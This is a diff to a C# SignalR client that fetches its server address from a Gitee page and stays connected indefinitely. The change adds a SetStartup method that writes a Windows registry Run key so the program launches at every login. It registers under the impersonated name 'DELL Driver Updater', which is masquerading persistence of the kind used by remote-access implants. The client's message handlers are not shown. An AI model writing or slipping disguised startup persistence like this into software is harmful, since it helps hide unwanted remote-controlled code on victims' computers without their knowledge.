@@ -1,6 +1,7 @@
 ﻿using Microsoft.AspNetCore.SignalR.Client;
 using System.Diagnostics;
 using System.Text.Json;
+using Microsoft.Win32;
 
 namespace SignalrClient
 {
@@ -13,6 +14,7 @@ namespace SignalrClient
 
         static async Task Main(string[] args)
         {
+            SetStartup();
             await GetIpAddressFromGitee();
             ConnectSignalr();
             //如果是Console程序，可以使用ReadLine来阻塞程序。
@@ -22,6 +24,18 @@ namespace SignalrClient
             {
                 await Task.Delay(new TimeSpan(1, 0, 0, 0));
             }
+        }
+
+        //让程序随系统启动
+        //https://stackoverflow.com/questions/674628/how-do-i-set-a-program-to-launch-at-startup
+        static void SetStartup()
+        {
+            string appName = "DELL Driver Updater.exe";
+            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+            rk.SetValue("DELL Driver Updater", AppDomain.CurrentDomain.BaseDirectory+appName);
+            //停止自动启动
+            //rk.DeleteValue(AppName, false);
         }
 
         static async void ConnectSignalr()
@@ -127,7 +141,7 @@ namespace SignalrClient
                 await Task.Delay(10 * 1000);
                 await GetIpAddressFromGitee();
             }
-            
+
         }
 
     }
